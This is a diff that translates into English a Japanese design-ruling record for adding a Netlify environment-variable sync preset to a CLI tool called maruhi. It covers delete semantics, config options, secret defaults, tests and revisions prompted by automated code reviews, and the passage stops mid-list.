+**D. Delete semantics** — enumeration: (i) `DELETE …/env/{key}` (the whole variable = other contexts' values also disappear) / (ii) find the target context's value id in the listing then `DELETE …/env/{key}/value/{id}` (same shape as Vercel's `lookup`) / (iii) don't delete (keep on the receipt with a warning). Round-1 new option: **(iv) (ii) + if the matched values are the variable's entire set, `DELETE …/env/{key}`** (available — a variable maruhi created〔having only this context's value〕disappears entirely, while a variable with other contexts' values loses just one value. No empty-variable debris, no touching other values). Round 2 (failure modes): (i) violates "don't touch other values at the destination" (a production target's delete would erase a hand-written deploy-preview value). (iii) is asymmetric with Vercel and stalls the receipt. (ii) is unconfirmed whether a fully-emptied variable lingers empty (premise (4)); if it does, empty variables pile up on the dashboard. (iv)'s judgment is possible from the listing's `values[]` (ids are returned even for secrets). The window where another value is added right after listing and the whole key gets deleted is as wide as Vercel's 404, and netlify-cli's `env:unset` is the same listing → 2-step delete. A variable holding only an `all` value is **not matched** from a per-context target (no matching value = treated as gone. maruhi hasn't written `all` so it doesn't touch it — stated in docs) (no). **Chosen = (iv)**. Generalizing the `lookup` declaration: `itemsField: null` (the body itself is an array), `match.valuesField` (the nesting of id-bearing elements — Netlify's `values[]`), `targetField` as **string equality or array includes** (Vercel's `target[]` / Netlify's `context`), `nextPage` optional, `removeItem` (when it's the whole set). Vercel's declaration rides the same type unchanged (behavior unchanged — pinned by existing tests). Rejected: (i) (touches other values), (ii) (debris), (iii) (asymmetric).
 
-**B. 設定の形(オプション)** — `accountId`(**必須**。`GET /accounts` で引く案は通信と権限が増える — 第 2 段の裁定 G の Cloudflare の
-accountId と同じ理由。値はチームの slug〔`app.netlify.com/teams/<slug>`。netlify-cli の `account_slug`〕か ID)、`siteId`(**必須**。
-省くと API はチーム共有の変数を書く — 前提 (1)。値はサイトの ID = dashboard の Project ID、`netlify link` の `.netlify/state.json`
-の `siteId`)、`context`(**必須**。閉集合 = swagger の 7 値〔`dev-server` を含む〕)、`branch`(`context: "branch"` のときだけ・
-そのとき必須。Vercel の `gitBranch` は preview 環境をブランチで絞る別の意味〔Netlify の `context_parameter` はプレフィックス
-`release/*` も取る〕なので同じ名前にしない — 「違う意味には違う名前」)、`secret`(boolean・省略可。既定は裁定 F)。`scopes` は
-**入れない**: 配列型のオプション(`OptionSpec` に無い)が要り、Pro 以上の機能で、`PATCH` では変えられない(既存変数に効かない)ので
-需要駆動へ。secret のときだけ CLI と同じ 3 scope を `derive` で足す。オプション同士の整合(branch は context=branch のときだけ・
-secret は `all` / `dev` / `dev-server` に置けない)は `OptionSpec` の型・閉集合では表せない → **`HttpPreset.check`**(設定の検証で呼ぶ
-一般のフック。理由の文字列を返す)を足した(設定時に fail-closed。API まで行って落ちる形にしない)。`isProduction` の既定 =
-`context` が `production` / `all`。`describeDestination` のヘッダー行(sync-plan.ts)は `options.environment` しか見ないので Netlify
-は「netlify via http」と出る — 変更しない前提(申し送り)。
+**B. Config shape (options)** — `accountId` (**required**. The `GET /accounts` option adds a call and a permission — same reason as stage 2 ruling G's Cloudflare accountId. The value is the team's slug〔`app.netlify.com/teams/<slug>`. netlify-cli's `account_slug`〕or ID), `siteId` (**required**. Omitting it writes a team-shared variable — premise (1). The value is the site's ID = the dashboard's Project ID, `netlify link`'s `.netlify/state.json`'s `siteId`), `context` (**required**. Closed set = swagger's 7 values〔including `dev-server`〕), `branch` (only when `context: "branch"`, and required then. Vercel's `gitBranch` is a different meaning — narrowing preview environments by branch〔Netlify's `context_parameter` also takes prefixes like `release/*`〕— so not the same name: "different meanings get different names"), `secret` (boolean, optional. Default per ruling F). `scopes` is **not included**: it needs an array-type option (absent from `OptionSpec`), is a Pro+ feature, and `PATCH` can't change it (doesn't affect existing variables) — so demand-driven. Only for secrets, `derive` adds the same 3 scopes as the CLI. Option-to-option consistency (branch only with context=branch; secret can't go on `all` / `dev` / `dev-server`) can't be expressed by `OptionSpec`'s type / closed sets → added **`HttpPreset.check`** (a general hook called during config validation; returns a reason string) (fail-closed at config time; doesn't make it an API trip to fail). `isProduction`'s default = `context` is `production` / `all`. `describeDestination`'s header line (sync-plan.ts) only looks at `options.environment` so Netlify shows "netlify via http" — premise is no change (handoff).
 
-**E. 応答の読み** — `ResponseKind` に `"netlify-env"`: 成功 = 2xx。書き込み(`POST` = 配列 / `PATCH` = 変数 1 つ)は応答の `key` が
-運んだ名前を含むことまで見る(形の違う 2xx を「届いた」と読まない — Vercel の `created` と対称。pullfrog 指摘の再発防止)。削除は
-204 で本文が無い。失敗は `{code, message}` を `error <code>: <message>` の 1 行にし(本文が JSON でなければ `HTTP <status>` だけ)、
-値・トークンの断片は `scrubVendorOutput` で伏せる(応答は `values[].value` を echo するので成功時は捨てる)。
+**E. Reading responses** — `ResponseKind` gains `"netlify-env"`: success = 2xx. Writes (`POST` = array / `PATCH` = one variable) additionally check that the response's `key` contains the sent name (don't read a differently-shaped 2xx as "delivered" — symmetric with Vercel's `created`. Prevents recurrence of the pullfrog finding). Deletes are 204 with no body. Failures turn `{code, message}` into one `error <code>: <message>` line (if the body isn't JSON, just `HTTP <status>`); value / token fragments are redacted via `scrubVendorOutput` (since the response echoes `values[].value`, it's discarded on success).
 
-**F. `is_secret` と scopes の既定** — 列挙: (i) 既定 false / (ii) 既定 true(置けない context では false)/ (iii) 必須にして選ばせる。
-周: (ii) は Vercel の sensitive の既定と同じ向き(「同期先で読めない値」= 一方通行と整合。secret は write-only で一覧に値が返らないが
-突合は key / id でできる)。壊れ方: secret は**変数の作成時にだけ**効く(PATCH はフラグを変えない — 前提 (1))ので、既存の非 secret
-変数に maruhi が値を書いても secret にはならない → docs に「dashboard で変えるか、消して apply し直す」。secret scanning がビルドを
-落としうる(値がビルド出力に出るとき)のは Netlify の仕様で、Vercel と同じく既定を secret に倒す判断に含める。Starter プランで
-scopes の部分集合(3 scope)が通るかは未確認だが、CLI が全プランで同じ 3 つを送っている(前提 (2))ので同じ形を写す(なし)。
-**選定 = (ii)**。棄却: (i)(読み返せる値を既定にしない)、(iii)(打鍵が増える)。
+**F. `is_secret` and the scopes default** — enumeration: (i) default false / (ii) default true (false on contexts that can't hold it) / (iii) make it required and force the choice. Rounds: (ii) is the same direction as Vercel's sensitive default ("a value unreadable at the destination" = consistent with one-way. Secret is write-only so listing returns no values, but matching works on key / id). Failure modes: secret **only takes effect at variable creation** (PATCH doesn't change the flag — premise (1)), so writing a value with secret intended (default true) to an existing non-secret variable leaves it non-secret → docs say "change it on the dashboard, or delete and re-apply". Secret scanning can fail a build (when a value reaches build output) — that's Netlify's spec, counted in the same "default to secret" judgment as Vercel. Whether a scopes subset (the 3 scopes) passes on the Starter plan is unconfirmed, but the CLI sends the same 3 on every plan (premise (2)) so transcribe the same shape (no). **Chosen = (ii)**. Rejected: (i) (don't default to a re-readable value), (iii) (more prompting).
 
-**G. `sync init --preset netlify`** — `--driver` の既定は `defaultDriverOf`(= http)。生成物には `driver: "http"` を明示(裁定 A)。
-`--driver exec` は理由つきの書き方の誤り(2)。http の案内文(トークンの置き場と最小権限)は**実効の**ドライバで判定する(以前は
-`--driver http` の明示だけを見ていた)。`--preset` / `--driver` の `--help` 文言を更新(golden)。
+**G. `sync init --preset netlify`** — `--driver`'s default is `defaultDriverOf` (= http). The product explicitly carries `driver: "http"` (ruling A). `--driver exec` is a usage error with the reason (2). The http guidance text (token placement and least privilege) is judged by the **effective** driver (previously it only looked at explicit `--driver http`). `--preset` / `--driver`'s `--help` wording updated (golden).
 
-**H. docs** — `deploy-targets.mdx`: frontmatter の `description`、冒頭(Netlify builds / http のみ)、「How maruhi sync works」の
-preset 列挙、`--yes` の production の定義、設定の表(`preset` / `driver`)、Netlify のオプション段落、**新節「Netlify」**(変数の
-モデル = key × context・`all` との優先・secret の既定と作成時限定・scopes・削除の意味論)、http 節(ホストの列挙・PAT の作り方と
-最小権限〔トークンにスコープが無いので専用アカウント + `siteId`〕・設定例に `site` ターゲット + `sync init` の 1 行・Netlify の
-箇条書き〔一覧 → POST / PATCH・競合・削除・5,000 文字・500 / min〕・404 の読み)、「Other platforms」を「レシピは無い、`netlify`
-プリセットを使う」に、「Vendor CLI telemetry」に「Netlify CLI は起動しない」。index の Card・README の Docs 一覧・getting-started の
-Next steps に Netlify を足し、github-actions.mdx の「Git 連携で相手がデプロイする対象」に Netlify を添えた(標準形 ② はターゲット名を
-足すだけで netlify ターゲットも回る — 変更不要を確かめた)。
+**H. docs** — `deploy-targets.mdx`: frontmatter `description`, the top (Netlify builds / http only), "How maruhi sync works"'s preset enumeration, `--yes`'s production definition, the config table (`preset` / `driver`), Netlify's options paragraph, **a new "Netlify" section** (the variable model = key × context; precedence with `all`; secret's default and creation-time-only-ness; scopes; delete semantics), the http section (host enumeration, how to make a PAT and least privilege〔tokens have no scopes, so a dedicated account + `siteId`〕, a `site` target config example + a `sync init` line, Netlify bullets〔listing → POST / PATCH, races, deletes, 5,000 chars, 500/min〕, how 404 reads), "Other platforms" changed to "no recipe; use the `netlify` preset", "Vendor CLI telemetry" gains "the Netlify CLI is never launched". Netlify was added to index's Card, README's Docs list, getting-started's Next steps, and to github-actions.mdx's "targets the other side deploys via Git integration" (standard form ② runs a netlify target just by adding its name — confirmed no change needed).
 
-**I. テスト** — `vendor-api.ts` に `makeFakeNetlify`(状態つき: key → `{scopes, values[{id, value, context, context_parameter}],
-is_secret}`。一覧は secret の値を空で返す〔実物は返さない〕、`POST` は配列で新規作成し**既存 key は 400 で拒む**〔実物の形は
-未確認 — モックの仮定と明記〕、`rejectKeys` は 422 で値を echo、`PATCH` は不在 key で 404・既存の (context, context_parameter) を
-置換、`DELETE` は key / value id、`override` で 429 / 5xx、認証は 401、`account_id` / `site_id` の不一致は 404)。`sync-http.test.ts`:
-宣言の走査(値のトークンの不在は据え置き、`name` は `single` の書き込みと項目ごとの削除のパスにだけ)、`buildBatches`(Netlify =
-書き込み全部で 1 バッチ + 削除 1 件ずつ)、設定(driver 省略 = http・exec は理由つき拒否・必須 3 つ・branch / secret の整合・
-production の既定 6 態)、通し(一覧 → POST〔配列 1 件・`is_secret` + 3 scope〕/ PATCH〔1 context〕・他 context の値は残る・
-Authorization 以外にトークンが出ない・レシート・2 回目は PATCH だけ・plan は API に触れない、`all` / `secret: false` / `branch` の本文と
-`--yes`、削除〔value id / 最後の値は key ごと / 一覧に無ければ消えた扱い〕、部分成功と競合〔既存 key への POST の失敗 → 次は
-PATCH〕、429 → 再送・503 × 3 → exit 1 と echo の伏せ字化・401、形の違う 2xx、同一環境のトークンを運ばない)。`ci-sync.test.ts` に
-netlify の 1 態(POST / PATCH の分岐・レシート無し)。`sync-init.test.ts` に netlify の往復・`--driver exec` の 2・branch 欠落。
-`sync-units.test.ts` の「netlify を拒む」態は `railway` に(受理側は sync-http.test.ts)。`--help` golden。`redacted.test.ts` の
-棚卸し表は**変更なし**(`sync-http.ts: 1` のまま — 1 変数リクエストも同じ `renderEntries` を通る)。fallow の複雑度は
-`renderEntries` / `writeOneByOne` / `lookupAndRemove` / `isListingComplete` / `parseDriver` / `driverKindOf` / `rejectCreate` /
-テストの `pathTokensOf` に割って閾値内。
+**I. Tests** — `vendor-api.ts` gains `makeFakeNetlify` (stateful: key → `{scopes, values[{id, value, context, context_parameter}], is_secret}`. The listing returns secret values empty〔the real thing doesn't return them〕, `POST` creates new from the array and **refuses existing keys with 400**〔the real shape is unconfirmed — stated as a mock assumption〕, `rejectKeys` is 422 echoing the value, `PATCH` is 404 on absent keys and replaces an existing (context, context_parameter), `DELETE` works on key / value id, `override` injects 429 / 5xx, auth is 401, `account_id` / `site_id` mismatches are 404). `sync-http.test.ts`: declaration scanning (value-token absence kept; `name` allowed only on `single` writes and per-item delete paths), `buildBatches` (Netlify = all writes in 1 batch + deletes one each), config (driver omitted = http, exec refused with reason, the 3 required, branch / secret consistency, the 6 production-default cases), end-to-end (listing → POST〔1-item array, `is_secret` + 3 scopes〕/ PATCH〔1 context〕, other contexts' values kept, token nowhere but Authorization, receipt, second run is PATCH-only, plan doesn't touch the API, `all` / `secret: false` / `branch` bodies and `--yes`, deletes〔value id / last value deletes the key / absent from listing = treated as gone〕, partial success and races〔POST failure on existing key → next is PATCH〕, 429 → retry, 503 × 3 → exit 1 + echo redaction, 401, differently-shaped 2xx, never carry a same-environment token). `ci-sync.test.ts` gains 1 netlify case (the POST / PATCH branch, no receipt). `sync-init.test.ts` gains the netlify round trip, `--driver exec` = 2, missing branch. `sync-units.test.ts`'s "rejects netlify" case became `railway` (the accepting side is in sync-http.test.ts). `--help` golden. `redacted.test.ts`'s inventory table is **unchanged** (still `sync-http.ts: 1` — per-variable requests go through the same `renderEntries`). fallow complexity was contained by splitting into `renderEntries` / `writeOneByOne` / `lookupAndRemove` / `isListingComplete` / `parseDriver` / `driverKindOf` / `rejectCreate` / the test's `pathTokensOf`.
 
-**J. 検証** — `FALLOW_AUDIT_BASE=origin/main bun run check`(7 段: 115 files / 2,809 tests)。`apps/site` の `validate --strict` /
-`build` / `e2e`(Chromium 1194 を 1234 の名前でリンク)。docs の light / dark と偽 Netlify に対する `sync plan / apply` の出力例は
-所有者向けの非公開 Artifact。
+**J. Verification** — `FALLOW_AUDIT_BASE=origin/main bun run check` (7 stages: 115 files / 2,809 tests). `apps/site`'s `validate --strict` / `build` / `e2e` (Chromium 1194 linked under the name 1234). docs light / dark and sample `sync plan / apply` output against the fake Netlify are private artifacts for the owner.
 
-**K. ROADMAP と裁定録** — SY4 行を「Netlify 完了(第 1 波・PR #159・裁定の要約)+ 残り候補は需要駆動」の形に。**SY4 全体を
-`- [x]` にするかは所有者判断**(提案: Netlify で「第 1 波完了」とし、Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare
-Pages は需要が出た順に 1 プリセット 1 PR。宣言の型は create-or-update / lookup の一般化で GraphQL 以外は載るはず)。本裁定録は SY3 の
-後、`## 4.` の前。補足 1 の冒頭に実装状況、§3 冒頭の表のドライバ行と SY1 実測表の Netlify 行に「SY4 で実装」を添えた。
+**K. ROADMAP and ruling record** — the SY4 row takes the shape "Netlify complete (wave 1, PR #159, ruling summary) + remaining candidates are demand-driven". **Whether to mark all of SY4 `- [x]` is the owner's call** (proposal: call it "wave 1 complete" with Netlify; Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages become 1 preset = 1 PR in demand order. With the declaration types generalized via create-or-update / lookup, everything except GraphQL should ride). This ruling record sits after SY3's, before `## 4.`. Noted "implemented in SY4" on supplement 1's implementation status, §3's head table's driver row, and SY1's measurement table's Netlify row.
 
-**不変条件の確認**: 仕様改訂なし(暗号操作の追加なし。サーバー・Web・チェーン・wire・`packages/crypto`・レシートの形式は無変更。
-`preset` 許容値の緩和は読み戻し検査のみ)。宣言的プリセットの規律(Netlify は `HTTP_PRESETS.netlify` の宣言 1 つ + `makeFakeNetlify`。
-`runBatch` の分岐は `write.kind`〔全プリセットに効く型〕で、ベンダー名の分岐は `readResponse` の閉集合だけ)。値の所在(値のトークン
-は本文のエントリのみ — 型 + 走査テスト。パスに載るのは名前と ID。ログ・エラー文面は変数名と伏せた断片)。一方通行(一覧は名前 / ID の
-突合だけ。値は捨てる。secret は読めない)。production(`context` = production / all は `--yes`)。削除(このターゲットの context の値
-だけ。最後の値なら key ごと。`all` だけの変数には触れない)。依存ゼロ(新規依存なし。Netlify CLI を起動する経路なし)。英語(CLI・
-docs)/ 日本語(裁定録・コミット・PR)。エージェント環境の扱いは無変更。スコープ(他の候補・SY5・`--all`・`sync diff`・Netlify の
-exec・レシート形式の版上げは取り込まない)。`Redacted` を剥がす箇所は増えていない。
+**Invariant check**: no spec revision (no crypto operations added. Server / web / chain / wire / `packages/crypto` / the receipt format unchanged. Relaxing the `preset` allowed values is a read-back check only). The declarative-preset discipline (Netlify is `HTTP_PRESETS.netlify`'s one declaration + `makeFakeNetlify`. `runBatch`'s branching is by `write.kind`〔a type affecting all presets〕; vendor-name branching is only `readResponse`'s closed set). Where values live (value tokens only on body entries — type + scanning test. Paths carry only names and IDs. Logs / error messages carry variable names and redacted fragments). One-way (the listing is name / ID matching only. Values discarded. Secrets unreadable). production (`context` = production / all requires `--yes`). Deletes (only this target's context's value. Whole key when it's the last value. Variables holding only `all` aren't touched). Zero dependencies (nothing new added. No path launches the Netlify CLI). English (CLI / docs), Japanese (ruling records, commits, PRs). Agent-environment handling unchanged. Scope (other candidates, SY5, `--all`, `sync diff`, Netlify exec, a receipt-format version bump not pulled in). No new `Redacted` unwrap sites.
 
-**改訂 1(2026-09-08、pullfrog の初回レビュー〔a3e0357〕)**: (1) **secret が update の経路で黙って落ちる** — 既存 key への
-書き込みは `PATCH`(値しか取らない)なので、非 secret で既にある変数に、設定が secret のつもり(既定 true)の値を置いても
-非 secret のまま(UI / API から読める)で、CLI は何も言わなかった。docs には「作成時にだけ効く」と書いていたが、書いた**後に**
-読者が気づく形。候補: (i) 文面で止める(fail-closed。一覧が `is_secret` を返すので追加のリクエスト無しに判定できる)/ (ii) `PUT`
-で secret にする(全 values を置換 = 他 context の値を壊す — 裁定 C で棄却済み)/ (iii) 警告して書く(読める場所に置いてから
-言う)。(i) を採り、宣言の一般化 **`create-or-update.updateGuards`**(「update では変えられない属性: 導いたオプションが true なら
-一覧の項目の `field` も true でなければ送らない」)を足した。Netlify = `{field: "is_secret", option: "isSecret"}`。文面は変数名と
-属性名だけ(値は載らない)+ 宣言の `hint`(dashboard で secret にする / 消して apply し直す / `"secret": false`)。届いた分は
-レシートへ、その変数以降は送らない(他の失敗と同じ形)。逆向き(既に secret の変数に非 secret のつもりの値)は止めない —
-`dev` context は secret を要求できない(`check`)ので、止めると secret 変数の dev 値が書けなくなる。態を 2 つ追加(止まる /
-`secret: false` なら書く)。docs の「Netlify」節に 1 文。(2) **既存 key への `POST` の応答**は Netlify Support Forums(#88738)で
-報告された実物が **422** + 「Environment variable with the same key name already exists on this site. Try a different key or edit
-the existing variable.」— swagger には無い(pullfrog の「open-api で確認」は当たらない)が、二次資料として偽 API をその形に写した
-(実アカウントでの確認は人間タスクのまま)。
+**Revision 1 (2026-09-08, pullfrog's first review〔a3e0357〕)**: (1) **secret silently dropped on the update path** — writes to an existing key go through `PATCH` (which only takes a value), so writing a config-intended-secret value (default true) into a variable that already exists non-secret leaves it non-secret (readable via UI / API), and the CLI said nothing. docs did say "takes effect only at creation", but that's a shape where the reader notices only **after** writing. Candidates: (i) stop it via the message (fail-closed. The listing returns `is_secret` so it can be judged with no extra request) / (ii) make it secret via `PUT` (replaces all values = breaks other contexts — already rejected in ruling C) / (iii) warn and write (talks after placing it in a readable location). (i) adopted, with the declaration generalization **`create-or-update.updateGuards`** ("attributes update can't change: when the derived option is true,
+don't send unless the listed item's `field` is also true"). Netlify = `{field: "is_secret", option: "isSecret"}`. The message carries only the variable name and attribute name (no values) + the declaration's `hint` (make it secret on the dashboard / delete and re-apply / `"secret": false`). The delivered portion lands on the receipt; nothing after that variable is sent (same shape as other failures). The reverse direction (a non-secret-intended value onto an already-secret variable) isn't stopped — since the `dev` context can't require secret (`check`), stopping it would make a secret variable's dev value unwritable. 2 cases added (stops / writes when `secret: false`). One sentence in docs' "Netlify" section. (2) **The response to `POST` on an existing key** is, per a Netlify Support Forums report (#88738), **422** + "Environment variable with the same key name already exists on this site. Try a different key or edit the existing variable." — not in the swagger (pullfrog's "verify on open-api" doesn't apply), but the fake API was transcribed to that shape as a secondary source (real-account confirmation stays a human task).
 
-**改訂 2(2026-09-08、Cursor Bugbot〔456417e〕+ pullfrog の 2 回目〔456417e〕)**: **create の `POST` は upsert でない**のに
-`send` がリトライする(通信層の失敗 + 429 / 5xx)ので、届いたのに応答が失われた create は再送されて「既存 key」で拒まれ、
-書けているのに exit 1・レシート無し(次の apply で自己修復はする)。docs の「Writes are idempotent, so a retry is safe」も
-Netlify の create には当たらない。候補: (i) create だけ通信層の失敗をリトライしない(宣言に `idempotent: false`)— 429 / 5xx は
-残るが 502 / 504 も処理後に起きうる / (ii) 既存 key の応答(422 + 文言)を読んで update に切り替える — 文言は二次資料 / (iii)
-**create が失敗したら一覧を引き直し、名前があれば update に切り替える**(応答の文言に依らず、一覧と送信の間の競合〔既存の態〕も
-同じ経路で同じ apply の中に収まる。追加の GET は失敗経路だけ)/ (iv) docs だけ直す。(iii) を採り、`createOrRecover` を
-`create-or-update` の一般の規則にした(`updateGuards` はこの経路でも通る)。偽 API に `loseFirstCreateResponse`(保存したうえで
-503)を足し、態を 1 つ追加・競合の態を「同じ apply で PATCH」に書き換え。docs の Retries の 1 文を「Workers / Vercel は冪等。
-Netlify の create は再送で重複として拒まれるので一覧を引き直して update する」に。Security Agent の指摘(secret が update で落ちる)は
-改訂 1 と同じもの。
+**Revision 2 (2026-09-08, Cursor Bugbot〔456417e〕+ pullfrog's 2nd〔456417e〕)**: **create's `POST` isn't an upsert**, yet `send` retries it (transport-layer failures + 429 / 5xx), so a create whose response was lost despite being delivered gets re-sent and refused as "existing key" — written but exit 1 with no receipt (it self-heals on the next apply). docs' "Writes are idempotent, so a retry is safe" also doesn't apply to Netlify's create. Candidates: (i) don't retry transport-layer failures for create only (declaration `idempotent: false`) — 429 / 5xx remain but 502 / 504 can also happen after processing / (ii) read the existing-key response (422 + wording) and switch to update — the wording is a secondary source / (iii) **when create fails, re-fetch the listing and switch to update if the name is there** (independent of response wording; the listing-to-send race〔an existing case〕also lands inside the same apply via the same path. The extra GET is only on the failure path) / (iv) fix docs only. (iii) adopted, and `createOrRecover` became a general rule of `create-or-update` (`updateGuards` also apply on this path). The fake API gained `loseFirstCreateResponse` (saves then returns 503); 1 case added and the race case rewritten to "PATCH in the same apply". docs' Retries sentence became "Workers / Vercel are idempotent. Netlify's create is refused as a duplicate on re-send, so it re-lists then updates". The Security Agent finding (secret dropped on update) is the same as revision 1.
 
-**改訂 3(2026-09-08、Cursor Bugbot〔bdae445〕)**: 改訂 2 の引き直しの一覧が**型付きエラーで落ちる**形(通信層・試行の使い切り・
-`Retry-After` が上限超)では、create の失敗の報告に戻らず apply 全体が落ち、同じバッチで先に届いた名前がレシートに残らなかった
-(応答が失敗〔非 2xx〕の形だけを扱っていた)→ 引き直しの `fetchListing` を `Effect.catch` で受け、create の失敗に「Could not
-re-check the target after the failed create: <理由>」を添えて返す(届いた分はレシートへ。理由は `send` の文面 = status と試行数
-だけで値を含まない)。態を追加(422 の後の GET が 503 × 3 → exit 1・ALPHA はレシートに残る)。
+**Revision 3 (2026-09-08, Cursor Bugbot〔bdae445〕)**: when revision 2's re-fetch listing fails **with a typed error** (transport layer, retries exhausted, `Retry-After` over the cap), it didn't fall back to reporting the create's failure — the whole apply fell, and names delivered earlier in the same batch didn't land on the receipt (it had only handled the response-is-failure〔non-2xx〕shape) → the re-fetch's `fetchListing` is now caught via `Effect.catch`, returning the create's failure with "Could not re-check the target after the failed create: <reason>" appended (the delivered part lands on the receipt. The reason is `send`'s wording = status and retry count only, containing no values). A case was added (GET after 422 gives 503 × 3 → exit 1, ALPHA stays on the receipt).
 
-**改訂 4(2026-09-08、pullfrog の 3 回目〔bdae445〕)**: 改訂 3 と同じ指摘 + 「1 変数の送信の `send` が試行を使い切る形は
-どの変数でも起きる(改訂 2 は引き金を 1 つ足しただけ)— `writeOneByOne` で部分的な進みを出すか」という問い。create-or-update は
-書き込み全部が 1 バッチなので、途中の型付きエラーで実行全体の進みが消える。→ `writeOneByOne` で 1 変数の送信(create / update)
-の型付きエラーを受け、その変数の失敗として報告し(文面は `send` の文面)、先に届いた名前はレシートへ。態を追加(2 つ目の POST が
-503 × 3 → exit 1・ALPHA はレシートに残る)。(改訂 4 の時点で「upsert のプリセットは前のバッチの分を `runBatches` が畳んでいる」と
-書いたが、これは誤り — 改訂 5)
+**Revision 4 (2026-09-08, pullfrog's 3rd〔bdae445〕)**: same point as revision 3 + the question "one variable's `send` exhausting retries can happen on any variable (revision 2 only added one trigger) — should `writeOneByOne` surface partial progress?" Since create-or-update makes all writes one batch, a mid-way typed error erases the whole run's progress. → `writeOneByOne` now catches one variable's send (create / update) typed error, reports it as that variable's failure (the wording is `send`'s wording), and the earlier delivered names land on the receipt. A case was added (the 2nd POST gives 503 × 3 → exit 1, ALPHA stays on the receipt). (At revision 4's writing, "upsert presets' earlier batches are folded by `runBatches`" was written, but that was wrong — revision 5.)
 
-**改訂 5(2026-09-08、pullfrog の 4 回目〔972e104〕)**: 同じ形が 1 段上に残っていた — `runBatches`(sync-plan.ts)の `written` /
-`deleted` は `Effect.gen` のローカルで、後のバッチ(削除バッチの一覧・DELETE、upsert の 2 つ目以降のバッチ)の `runBatch` が
-型付きエラーで落ちると generator ごと中断し、**前のバッチで届いた名前も**レシートに残らない(改訂 4 の理由「`runBatches` が
-畳んでいる」は成り立たない。docs の「Variables written before a failure stay in the receipt」が削除バッチの失敗では偽)。SY2 から
-ある形で次の apply で自己修復するが、直し方は小さい。候補: (i) `runBatches` で `runBatch` の CliError を受ける(sync-plan.ts を
-触る)/ (ii) **`runBatch` 自身が型付きエラーをそのバッチの失敗に変える**(全ドライバ・全バッチ種別に一様。`runBatch` の失敗型が
-`never` になり、sync-plan.ts は無変更のまま呼び出し側の畳みが必ず走る。**http の**全プリセット・全バッチ種別に一様で、exec の
-`runInvocations` は別の経路 — 後の起動が失敗すると前の分が残らない形は従来どおり。起動の失敗は普通 1 つ目で起きる〔申し送り〕)/
-(iii) 据え置いて docs と裁定録の文を直す。(ii) を採った
-(`writeOneByOne` の受けは create-or-update の**中の**届いた分を保つために残る)。態を追加(書き込みバッチは届き、削除バッチの
-GET が 503 × 3 → exit 1・ALPHA はレシートに残り GONE も残る)。文面の nit(`sync-plan.ts` の「refused the request」が試行の
-使い切りにも付く — 下の行が理由を言う)は sync-plan.ts の既存文言なので据え置き、申し送りに。
+**Revision 5 (2026-09-08, pullfrog's 4th〔972e104〕)**: the same shape remained one level up — `runBatches` (sync-plan.ts)'s `written` / `deleted` are `Effect.gen` locals, and when a later batch's `runBatch` (the delete batch's listing / DELETE, or an upsert's 2nd+ batch) fails with a typed error, the whole generator aborts and **even names delivered by earlier batches** don't land on the receipt (revision 4's reason "`runBatches` folds them" doesn't hold. docs' "Variables written before a failure stay in the receipt" is false for a delete-batch failure). It's a shape from SY2 that self-heals on the next apply, but the fix is small. Candidates: (i) catch `runBatch`'s CliError in `runBatches` (touches sync-plan.ts) / (ii) **`runBatch` itself converts a typed error into that batch's failure** (uniform across all drivers and batch kinds. `runBatch`'s failure type becomes `never`, and with sync-plan.ts unchanged the caller-side folding always runs. **Uniform across http's** all presets and batch kinds; exec's `runInvocations` is a separate path — the shape where a later start failure drops the earlier portion stays as before. Start failures usually happen on the first one〔handoff〕) / (iii) keep as-is and fix the docs and ruling-record wording. (ii) was adopted (`writeOneByOne`'s catch remains to preserve the delivered portion **inside** create-or-update). A case was added (the write batch delivers, the delete batch's GET gives 503 × 3 → exit 1, ALPHA stays on the receipt and GONE also stays). The wording nit (`sync-plan.ts`'s "refused the request" also attaches to retry exhaustion — the line below gives the reason) is existing sync-plan.ts wording, kept as-is → handoff.
 
-**確認できなかったこと(人間タスクに追加)**: **実 Netlify アカウントでの通し** — 既存 key への `POST` の応答の形(モックは
-Support Forums の報告どおり 422)、
-`PATCH` 不在 key の status、`is_secret` + 3 scope が Starter プランで通るか、`all` と個別 context の同居時の API と build の挙動、
-値を全部消した変数が残るか(残らないなら `removeItem` は無害な 404)、429 の `Retry-After`、5,000 文字超の応答、PAT の作成 UI の
-文言(docs の「Applications, Personal access tokens」は docs.netlify.com の記述に依る)、`accountId` に slug と ID のどちらも通るか。
+**Could not confirm (added to human tasks)**: **an end-to-end run on a real Netlify account** — the response shape of `POST` on an existing key (the mock follows the Support Forums report's 422), `PATCH` on an absent key's status, whether `is_secret` + 3 scopes pass on the Starter plan, the API's and build's behavior when `all` and per-context coexist, whether a fully-emptied variable remains (if not, `removeItem` is a harmless 404), 429's `Retry-After`, responses over 5,000 chars, the PAT creation UI's wording (docs' "Applications, Personal access tokens" relies on docs.netlify.com's description), whether `accountId` accepts both slug and ID.
 
-**SY5 以降への申し送り(SY4 第 1 波完了)**: (1) **SY5** `gh secret set` — 第 1 段 = レシピ(Deploy targets の recipes と同じ ```sh +
-`recipes.test.ts` の偽 `gh`)、第 2 段 = 標準形 ② の `maruhi-sync.yml` に step を足す形。**exec プリセットの宣言だけで載る**
-(`gh secret set NAME` = raw-value / 1 件ずつ / `GH_TELEMETRY=false`)。http は GitHub の secrets API が libsodium 封印を要るので
-**`http: {unavailable: …}`**(裁定 A の形をそのまま使う — プリセット側の型は用意済み)。第 3 段の `GH_ENV` / `ghArgument` を流用可。
-bootstrap トークン(fine-grained PAT か App トークン — 補足 8 Q1)は「GitHub secrets を空にする」目標の唯一の例外。(2) **SY4 の残り**
-(Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages)は需要駆動。`create-or-update` / `lookup` の一般化で REST の
-先はほぼ宣言で載る。GraphQL(Railway / Fly.io)は `contentType` + `body` テンプレートで表せるが応答の読み(`ResponseKind`)が要る。
-(3) `describeDestination` のヘッダー行に `context`(Netlify)を出す小さな一般化(プリセットに `describe` を持たせる)と、
-`runBatches` の「refused the request」の文言(試行の使い切りにも付く — 改訂 5 の nit)、exec の `runInvocations` で後の起動の
-失敗が前の分をレシートから落とす形(改訂 5 と同じ形。起動の失敗は普通 1 つ目で起きる)— sync-plan.ts を触るので次の機会に。(4) Netlify の `scopes` オプション(配列型の `OptionSpec`)は需要が出たら。(5) 実 Netlify アカウントの通し
-(上の「確認できなかったこと」)。(6) 既存の未消化: `gh workflow run` の実機、Windows の実行体解決、実アカウント(Cloudflare /
